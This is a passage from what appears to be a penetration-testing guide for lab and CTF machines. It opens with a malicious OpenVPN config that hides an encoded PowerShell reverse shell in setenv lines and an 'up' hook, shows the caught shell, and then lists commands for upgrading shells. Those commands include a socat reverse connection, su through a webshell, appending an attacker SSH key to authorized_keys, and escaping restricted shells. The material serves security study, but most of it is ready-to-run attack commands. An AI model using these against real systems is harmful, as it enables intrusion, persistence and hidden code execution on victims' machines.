setenv m1 ‘AGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQApACAAewANAAoAJAByAGUAYQBkACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABuAGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByACwAJABwAG8AcwAsACQAbgBlAHQAdwBvAHIAawBiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACAALQA’
setenv n1 ‘gACQAcABvAHMAKQANAAoAJABwAG8AcwArAD0AJAByAGUAYQBkADsAIABpAGYAIAAoACQAcABvAHMAIAAtAGEAbgBkACAAKAAkAG4AZQB0AHcAbwByAGsAYgB1AGYAZgBlAHIAWwAwAC4ALgAkACgAJABwAG8AcwAtADEAKQBdACAALQBjAG8AbgB0AGEAaQBuAHMAIAAxADAAKQApACAAewBiAHIAZQBhAGsAfQB9AA0ACg’
setenv o1 ‘BpAGYAIAAoACQAcABvAHMAIAAtAGcAdAAgADAAKQAgAHsADQAKACQAcwB0AHIAaQBuAGcAIAA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbgBlAHQAdwBvAHIAawBiAHUAZgBmAGUAcgAsADAALAAkAHAAbwBzACkADQAKACQAaQBuAHAAdQB0AHMAdAByAGUAYQBtAC4AdwByAGkAd’
setenv p1 ‘ABlACgAJABzAHQAcgBpAG4AZwApAA0ACgBzAHQAYQByAHQALQBzAGwAZQBlAHAAIAAxAA0ACgBpAGYAIAAoACQAcAByAG8AYwBlAHMAcwAuAEUAeABpAHQAQwBvAGQAZQAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AGMAbABlAGEAbgB1AHAAfQANAAoAZQBsAHMAZQAgAHsADQAKACQAbwB1AHQAIAA9ACAAJABlAG4A’
setenv q1 ‘YwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAKQApAA0ACgB3AGgAaQBsAGUAKAAkAG8AdQB0AHAAdQB0AHMAdAByAGUAYQBtAC4AUABlAGUAawAoACkAIAAtAG4AZQAgAC0AMQApAHsADQAKACQAbwB1AHQAIAArAD0AIAAkAGUAbgBjAG8’
setenv r1 ‘AZABpAG4AZwAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABvAHUAdABwAHUAdABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAApACkAOwAgAGkAZgAgACgAJABvAHUAdAAgAC0AZQBxACAAJABzAHQAcgBpAG4AZwApACAAewAkAG8AdQB0ACAAPQAgACcAJwB9AH0ADQAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAG’
setenv s1 ‘UAbgBjAG8AZABpAG4AZwAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwB1AHQAKQAsADAALAAkAG8AdQB0AC4AbABlAG4AZwB0AGgAKQANAAoAJABvAHUAdAAgAD0AIAAkAG4AdQBsAGwADQAKACQAcwB0AHIAaQBuAGcAIAA9ACAAJABuAHUAbABsAH0AfQAgAGUAbABzAGUAIAB7AGMAbABlAGEAbgB1AHAAfQB9AA==’
up &#39;C:\\Windows\\System32\\cmd.exe /c (start %z1% -WindowStyle Hidden -EncodedCommand %a1%%b1%%c1%%d1%%e1%%f1%%g1%%h1%%i1%%j1%%k1%%l1%%m1%%n1%%o1%%p1%%q1%%r1%%s1% ) ||&#39;
</pre></div>
</div>
<p>We can see the encoded script has been split over a setenv commands. At the very end, the script just runs all the environment variables together.</p>
<p>Result</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>albinolobster@ubuntu:~$ nc -lvp 8181
Listening on [0.0.0.0] (family 0, port 8181)
Connection from [192.168.1.226] port 8181 [tcp/*] accepted (family 2, sport 51082)
Microsoft Windows [Version 10.0.17134.48]
© 2018 Microsoft Corporation. All rights reserved.
C:\Users\albinolobster\OpenVPN\config\albino_lobster&gt;whoami
desktop-r5u6pvd\albinolobster
C:\Users\albinolobster\OpenVPN\config\albino_lobster&gt;
</pre></div>
</div>
<p>Using untrusted ovpn files is dangerous. You are allowing a stranger to execute arbitrary commands on your computer. Some OpenVPN compatible clients like Viscosity and Ubuntu’s Network Manager GUI disable this behavior.</p>
</section>
</section>
</section>
<section id="spawning-a-tty-shell">
<span id="id7"></span><h2>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Link to this heading"></a></h2>
<p>Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. <a class="reference external" href="https://netsec.ws/?p=337">Spawning a TTY Shell</a> and <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> have provided multiple ways to get a tty shell</p>
<section id="id9">
<h3>Python<a class="headerlink" href="#id9" title="Link to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;/bin/bash&quot;)&#39;</span>
</pre></div>
</div>
</section>
<section id="sh">
<h3>sh<a class="headerlink" href="#sh" title="Link to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/bin/sh<span class="w"> </span>-i
</pre></div>
</div>
</section>
<section id="id10">
<h3>Perl<a class="headerlink" href="#id10" title="Link to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>perl:<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>
</pre></div>
</div>
</section>
<section id="id11">
<h3>Ruby<a class="headerlink" href="#id11" title="Link to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ruby:<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span>
</pre></div>
</div>
</section>
<section id="lua">
<h3>Lua<a class="headerlink" href="#lua" title="Link to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>lua:<span class="w"> </span>os.execute<span class="o">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">)</span>
</pre></div>
</div>
</section>
<section id="irb">
<h3>IRB<a class="headerlink" href="#irb" title="Link to this heading"></a></h3>
<p>(From within IRB)</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span>
</pre></div>
</div>
</section>
<section id="vi">
<h3>VI<a class="headerlink" href="#vi" title="Link to this heading"></a></h3>
<p>(From within vi)</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>:!bash
</pre></div>
</div>
<p>(From within vi)</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>:set<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>/bin/bash:shell
</pre></div>
</div>
<p>Also, if we execute</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">vi ;/bin/bash</span>
</pre></div>
</div>
<p>Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.</p>
</section>
<section id="id12">
<h3>Nmap<a class="headerlink" href="#id12" title="Link to this heading"></a></h3>
<p>(From within nmap)</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>!sh
</pre></div>
</div>
</section>
<section id="expect">
<h3>Expect<a class="headerlink" href="#expect" title="Link to this heading"></a></h3>
<p>Using “Expect” To Get A TTY</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$<span class="w"> </span>cat<span class="w"> </span>sh.exp
<span class="c1">#!/usr/bin/expect</span>
<span class="c1"># Spawn a shell, then allow the user to interact with it.</span>
<span class="c1"># The new shell will have a good enough TTY to run tools like ssh, su and login</span>
spawn<span class="w"> </span>sh
interact
</pre></div>
</div>
</section>
<section id="sneaky-stealthy-su-in-web-shells">
<h3>Sneaky Stealthy SU in (Web) Shells<a class="headerlink" href="#sneaky-stealthy-su-in-web-shells" title="Link to this heading"></a></h3>
<p>Let’s say we have a webshell on the server (probably, we would be logged in as a apache user), however, if we have credentials of another user, and we want to login we need a tty shell. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell.</p>
<p><strong>Example</strong></p>
<p>Webshell like</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://IP/shell.php?cmd=id</span>
</pre></div>
</div>
<p>If we try</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo password | su -c whoami</span>
</pre></div>
</div>
<p>Probably will get</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">standard in must be a tty</span>
</pre></div>
</div>
<p>The su command would work from a terminal, however, would not take in raw stuff via the shell’s Standard Input. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp gp-VirtualEnv">(sleep 1; echo password)</span> <span class="go">| python -c &quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;whoami&#39;]);&quot;</span>
<span class="go">root</span>
</pre></div>
</div>
<p>The above has been referenced from SANS <a class="reference external" href="https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#">Sneaky Stealthy SU in (Web) Shells</a></p>
</section>
<section id="spawning-a-fully-interactive-ttys-shell">
<h3>Spawning a Fully Interactive TTYs Shell<a class="headerlink" href="#spawning-a-fully-interactive-ttys-shell" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://twitter.com/ropnop">Ronnie Flathers</a> has already written a great blog on <a class="reference external" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrading simple shells to fully interactive TTYs</a> Hence, almost everything is taken from that blog post and kept here for completion.</p>
<p>Many times, we will not get a fully interactive shell therefore it will/ have:</p>
<ul class="simple">
<li><p>Difficult to use the text editors like vim</p></li>
<li><p>No tab-complete</p></li>
<li><p>No up arrow history</p></li>
<li><p>No job control</p></li>
</ul>
<section id="socat">
<h4>Socat<a class="headerlink" href="#socat" title="Link to this heading"></a></h4>
<p>Socat can be used to pass full TTY’s over TCP connections.</p>
<p>On Kali-Machine (Attackers - Probably yours)</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">socat file:`tty`,raw,echo=0 tcp-listen:4444</span>
</pre></div>
</div>
<p>On Victim (launch):</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span>
</pre></div>
</div>
<p>If socat isn’t installed, download standalone binaries that can be downloaded from <a class="reference external" href="https://github.com/andrew-d/static-binaries">static binaries</a></p>
<p>Download the correct binary architecture of socat to a writable directory, chmod it, execute</p>
</section>
<section id="stty">
<h4>stty<a class="headerlink" href="#stty" title="Link to this heading"></a></h4>
<p>Use the methods mentioned in <a class="reference internal" href="LFC-VulnerableMachines.html#spawning-a-tty-shell"><span class="std std-ref">Spawning a TTY Shell</span></a></p>
<p>Once bash is running in the PTY, background the shell with Ctrl-Z
While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo $TERM</span>
<span class="go">xterm-256color</span>
</pre></div>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">stty -a</span>
<span class="go">speed 38400 baud; rows 59; columns 264; line = 0;</span>
<span class="go">intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;   discard = ^O; min = 1; time = 0;</span>
<span class="go">-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts</span>
<span class="go">-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8</span>
<span class="go">opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0</span>
<span class="go">isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc</span>
</pre></div>
</div>
<p>The information needed is the TERM type (“xterm-256color”) and the size of the current TTY (“rows 38; columns 116”)</p>
<p>With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">stty raw -echo</span>
</pre></div>
</div>
<p>With a raw stty, input/ output will look weird and you won’t see the next commands, but as you type they are being processed.</p>
<p>Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.</p>
<p>After the reset the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$ </span><span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>bash
<span class="gp">$ </span><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm256-color
<span class="gp">$ </span>stty<span class="w"> </span>rows<span class="w"> </span><span class="m">38</span><span class="w"> </span>columns<span class="w"> </span><span class="m">116</span>
</pre></div>
</div>
<p>The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection</p>
</section>
<section id="ssh-key">
<h4>ssh-key<a class="headerlink" href="#ssh-key" title="Link to this heading"></a></h4>
<p>If we have some user shell or access, probably it would be a good idea to generate a new ssh private-public key pair using ssh-keygen</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ssh-keygen</span>
<span class="go">Generating public/private rsa key pair.</span>
<span class="go">Enter file in which to save the key (/home/bitvijays/.ssh/id_rsa):</span>
<span class="go">Enter passphrase (empty for no passphrase):</span>
<span class="go">Enter same passphrase again:</span>
<span class="go">Your identification has been saved in /home/bitvijays/.ssh/id_rsa.</span>
<span class="go">Your public key has been saved in /home/bitvijays/.ssh/id_rsa.pub.</span>
<span class="go">The key fingerprint is:</span>
<span class="go">SHA256:JbdAhAIPl8qm/kCANJcpggeVoZqWnFRvVbxu2u9zc5U bitvijays@Kali-Home</span>
<span class="go">The key&#39;s randomart image is:</span>
<span class="go">+---[RSA 2048]----+</span>
<span class="go">|o==*+. +=.       |</span>
<span class="go">|=o**+ o. .       |</span>
<span class="go">|=+...+  o +      |</span>
<span class="go">|=.* .    * .     |</span>
<span class="go">|oO      S .     .|</span>
<span class="go">|+        o     E.|</span>
<span class="go">|..      +       .|</span>
<span class="go">| ..    . . . o . |</span>
<span class="go">|  ..      ooo o  |</span>
<span class="go">+----[SHA256]-----+</span>
</pre></div>
</div>
<p>Copy/ Append the public part to /home/user/.ssh/authorized_keys</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">cat /home/bitvijays/.ssh/id_rsa.pub</span>

<span class="go">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+tbCpnhU5qQm6typWI52FCin6NDYP0hmQFfag2kDwMDIS0j1ke/kuxfqfQKlbva9eo6IUaCrjIuAqbsZTsVjyFfjzo/hDKycR1M5/115Jx4q4v48a7BNnuUqi +qzUFjldFzfuTp6XM1n+Y1B6tQJJc9WruOFUNK2EX6pmOIkJ8QPTvMXYaxwol84MRb89V9vHCbfDrbWFhoA6hzeQVtI01ThMpQQqGv5LS+rI0GVlZnT8cUye0uiGZW7ek9DdcTEDtMUv1Y99zivk4FJmQWLzxplP5dUJ1NH5rm6YBH8CoQHLextWc36Ih18xsyzW8qK4Bfl4sOtESHT5/3PlkQHN bitvijays@Kali-Home&quot; &gt;&gt; /home/user/.ssh/authorized_keys</span>
</pre></div>
</div>
<p>Now, ssh to the box using that user.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ssh user@hostname -i id_rsa</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="restricted-shell">
<h2>Restricted Shell<a class="headerlink" href="#restricted-shell" title="Link to this heading"></a></h2>
<p>Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from <a class="reference external" href="https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells">Escaping Restricted Linux Shells</a>, <a class="reference external" href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">Escape from SHELLcatraz</a></p>
<section id="definition">
<h3>Definition<a class="headerlink" href="#definition" title="Link to this heading"></a></h3>
<p>It limits a user’s ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:</p>
<ul class="simple">
<li><p>Using the <code class="docutils literal notranslate"><span class="pre">cd</span></code> command to change directories.</p></li>
<li><p>Setting or un-setting certain environment variables (i.e. <code class="docutils literal notranslate"><span class="pre">SHELL</span></code>, <code class="docutils literal notranslate"><span class="pre">PATH</span></code>, etc…).</p></li>
<li><p>Specifying command names that contain slashes.</p></li>
<li><p>Specifying a filename containing a slash as an argument to the <code class="docutils literal notranslate"><span class="pre">.</span></code> built-in command.</p></li>
<li><p>Specifying a filename containing a slash as an argument to the <code class="docutils literal notranslate"><span class="pre">-p</span></code> option to the <code class="docutils literal notranslate"><span class="pre">hash</span></code> built-in command.</p></li>
<li><p>Importing function definitions from the shell environment at startup.</p></li>
<li><p>Parsing the value of SHELLOPTS from the shell environment at startup.</p></li>
<li><p>Redirecting output using the <code class="docutils literal notranslate"><span class="pre">&gt;</span></code>, <code class="docutils literal notranslate"><span class="pre">&gt;|</span></code>, <code class="docutils literal notranslate"><span class="pre">&quot;</span></code>, <code class="docutils literal notranslate"><span class="pre">&gt;&amp;</span></code>, <code class="docutils literal notranslate"><span class="pre">&amp;&gt;</span></code>, and <code class="docutils literal notranslate"><span class="pre">&gt;&gt;</span></code> redirection operators.</p></li>
<li><p>Using the <code class="docutils literal notranslate"><span class="pre">exec</span></code> built-in to replace the shell with another command.</p></li>
<li><p>Adding or deleting built-in commands with the <code class="docutils literal notranslate"><span class="pre">-f</span></code> and <code class="docutils literal notranslate"><span class="pre">-d</span></code> options to the enable built-in.</p></li>
<li><p>Using the <code class="docutils literal notranslate"><span class="pre">enable</span></code> built-in command to enable disabled shell built-ins.</p></li>
<li><p>Specifying the <code class="docutils literal notranslate"><span class="pre">-p</span></code> option to the <code class="docutils literal notranslate"><span class="pre">command</span></code> built-in.</p></li>
<li><p>Turning off restricted mode with <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">+r</span></code> or <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">+o</span> <span class="pre">restricted</span></code></p></li>
</ul>
<p>Real shell implements restricted shells:</p>
<ul>
<li><p>rbash</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bash<span class="w"> </span>-r
<span class="nb">cd</span>
bash:<span class="w"> </span>cd:<span class="w"> </span>restricted
</pre></div>
</div>
</li>
<li><p>rsh</p></li>
<li><p>rksh</p></li>
</ul>
</section>
<section id="getting-out-of-restricted-shell">
<h3>Getting out of restricted shell<a class="headerlink" href="#getting-out-of-restricted-shell" title="Link to this heading"></a></h3>
<section id="reconnaissance">
<h4>Reconnaissance<a class="headerlink" href="#reconnaissance" title="Link to this heading"></a></h4>
<p>Find out information about the environment.</p>
<ul class="simple">
<li><p>Run <code class="docutils literal notranslate"><span class="pre">env</span></code> to see exported environment variables</p></li>
<li><p>Run <code class="docutils literal notranslate"><span class="pre">export</span> <span class="pre">-p</span></code> to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH (<code class="docutils literal notranslate"><span class="pre">$PATH</span></code>) and SHELL (<code class="docutils literal notranslate"><span class="pre">$SHELL</span></code>) variables are <code class="docutils literal notranslate"><span class="pre">-rx</span></code>, which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell!</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc…).</p></li>
<li><p>If the PATH is writeable, then you’ll be able to set it to any directory you want. We recommend setting it to one that has commands vulnerable to shell escapes.</p></li>
</ul>
</div></blockquote>
<ul class="simple">
<li><p>Try basic Unix commands and see what’s allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.</p></li>
</ul>
</section>
<section id="quick-wins">
<h4>Quick Wins<a class="headerlink" href="#quick-wins" title="Link to this heading"></a></h4>
<ul>
<li><p>If <code class="docutils literal notranslate"><span class="pre">/</span></code> is allowed in commands just run <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code></p></li>
<li><p>If we can set <code class="docutils literal notranslate"><span class="pre">PATH</span></code> or <code class="docutils literal notranslate"><span class="pre">SHELL</span></code> variable</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">export PATH=/bin:/usr/bin:/sbin:$PATH</span>
<span class="go">export SHELL=/bin/sh</span>
</pre></div>
</div>
<p>or if <code class="docutils literal notranslate"><span class="pre">chsh</span></code> command is present just change the <code class="docutils literal notranslate"><span class="pre">shell</span></code> to <code class="docutils literal notranslate"><span class="pre">/bin/bash</span></code></p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">chsh</span>
<span class="go">password: &lt;password will be asked&gt;</span>
<span class="go">/bin/bash</span>
</pre></div>
</div>
</li>
<li><p>If we can copy files into existing PATH, copy</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">cp /bin/sh /current/directory; sh</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="taking-help-of-binaries">
<h4>Taking help of binaries<a class="headerlink" href="#taking-help-of-binaries" title="Link to this heading"></a></h4>
<p>Some commands let us execute other system commands, often bypassing shell restrictions</p>
<ul class="simple">
<li><p><code class="docutils literal notranslate"><span class="pre">ftp</span> <span class="pre">-&gt;</span> <span class="pre">!/bin/sh</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">gdb</span> <span class="pre">-&gt;</span> <span class="pre">!/bin/sh</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">more/</span> <span class="pre">less/</span> <span class="pre">man</span> <span class="pre">-&gt;</span> <span class="pre">!/bin/sh</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">vi</span> <span class="pre">-&gt;</span> <span class="pre">:!/bin/sh</span></code> : Refer <a class="reference external" href="http://airnesstheman.blogspot.in/2011/05/breaking-out-of-jail-restricted-shell.html">Breaking out of Jail : Restricted Shell</a> and <a class="reference external" href="http://linuxshellaccount.blogspot.in/2008/05/restricted-accounts-and-vim-tricks-in.html">Restricted Accounts and Vim Tricks in Linux and Unix</a></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">scp</span> <span class="pre">-S</span> <span class="pre">/tmp/getMeOut.sh</span> <span class="pre">x</span> <span class="pre">y</span></code> : Refer <a class="reference external" href="http://pentestmonkey.net/blog/rbash-scp">Breaking out of rbash using scp</a></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">awk</span> <span class="pre">'BEGIN</span> <span class="pre">{system(&quot;/bin/sh&quot;)}'</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">find</span> <span class="pre">/</span> <span class="pre">-name</span> <span class="pre">someName</span> <span class="pre">-exec</span> <span class="pre">/bin/sh</span> <span class="pre">\</span></code>;</p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">tee</span></code></p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo &quot;Your evil code&quot; | tee script.sh</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Invoke shell thru scripting language</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>Python</p></li>
</ul>
<blockquote>
<div><div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import os; os.system(&quot;/bin/bash&quot;)</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Perl</p></li>
</ul>
<blockquote>
<div><div class="highlight-perl notranslate"><div class="highlight"><pre><span></span><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
<p><code class="docutils literal notranslate"><span class="pre">find</span> <span class="pre">.</span></code> can be used to see the files in the current directory.</p>
</section>
<section id="sshing-from-outside">
<h4>SSHing from outside<a class="headerlink" href="#sshing-from-outside" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Use SSH on your machine to execute commands before the remote shell is loaded:</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ssh username@IP -t &quot;/bin/sh&quot;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Start the remote shell without loading “rc” profile (where most of the limitations are often configured)</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ssh username@IP -t &quot;bash --noprofile&quot;</span>

<span class="go">-t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g. when implementing menu services.  Multiple -t options force tty allocation, even if ssh has no local tty</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="getting-out-of-rvim">
<h4>Getting out of rvim<a class="headerlink" href="#getting-out-of-rvim" title="Link to this heading"></a></h4>
<p>Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techniques and, on top of that, no shell commands at all. Taken from <a class="reference external" href="https://ctftime.org/writeup/5784">vimjail</a></p>
<ul class="simple">
<li><p>To list all installed features it is possible to use ‘:version’ vim command.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">:version</span>
<span class="go">VIM - Vi IMproved 8.0 (2016 Sep 12, compiled Nov 04 2017 04:17:46)</span>
<span class="go">Included patches: 1-1257</span>
<span class="go">Modified by pkg-vim-maintainers@lists.alioth.debian.org</span>
<span class="go">Compiled by pkg-vim-maintainers@lists.alioth.debian.org</span>
<span class="go">Huge version with GTK2 GUI.  Features included (+) or not (-):</span>
<span class="go">+acl             +cindent         +cryptv          -ebcdic          +float           +job             +listcmds        +mouse_dec       +multi_byte      +persistent_undo  +rightleft       +syntax          +termresponse    +visual          +X11</span>
<span class="go">+arabic          +clientserver    +cscope          +emacs_tags      +folding         +jumplist        +localmap        +mouse_gpm       +multi_lang      +postscript       +ruby            +tag_binary      +textobjects     +visualextra     -xfontset</span>
<span class="go">+autocmd         +clipboard       +cursorbind      +eval            -footer          +keymap          +lua             -mouse_jsbterm   -mzscheme        +printer          +scrollbind      +tag_old_static  +timers          +viminfo         +xim</span>
<span class="go">+balloon_eval    +cmdline_compl   +cursorshape     +ex_extra        +fork()          +lambda          +menu            +mouse_netterm   +netbeans_intg   +profile          +signs           -tag_any_white   +title           +vreplace        +xpm</span>
<span class="go">+browse          +cmdline_hist    +dialog_con_gui  +extra_search    +gettext         +langmap         +mksession       +mouse_sgr       +num64           -python           +smartindent     +tcl             +toolbar         +wildignore      +xsmp_interact</span>
<span class="go">++builtin_terms  +cmdline_info    +diff            +farsi           -hangul_input    +libcall         +modify_fname    -mouse_sysmouse  +packages        +python3          +startuptime     +termguicolors   +user_commands   +wildmenu        +xterm_clipboard</span>
<span class="go">+byte_offset     +comments        +digraphs        +file_in_path    +iconv           +linebreak       +mouse           +mouse_urxvt     +path_extra      +quickfix         +statusline      +terminal        +vertsplit       +windows         -xterm_save</span>
<span class="go">+channel         +conceal         +dnd             +find_in_path    +insert_expand   +lispindent      +mouseshape      +mouse_xterm     +perl            +reltime         - sun_workshop    +terminfo        +virtualedit     +writebackup</span>
<span class="go">  system vimrc file: &quot;$VIM/vimrc&quot;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Examining installed features and figure out which interpreter is installed.</p></li>
<li><p>If python/ python3 has been installed</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">:python3 import pty;pty.spawn(&quot;/bin/bash&quot;)</span>
</pre></div>
</div>
</div></blockquote>
</section>
</section>
</section>
<section id="gather-information-from-files">
<h2>Gather information from files<a class="headerlink" href="#gather-information-from-files" title="Link to this heading"></a></h2>
<p>In case of LFI or unprivileged shell, gathering information could be very useful. Mostly taken from <a class="reference external" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k Linux Privilege Escalation Blog</a></p>
<section id="operating-system">
<h3>Operating System<a class="headerlink" href="#operating-system" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">cat /etc/issue</span>
<span class="go">cat /etc/*-release</span>
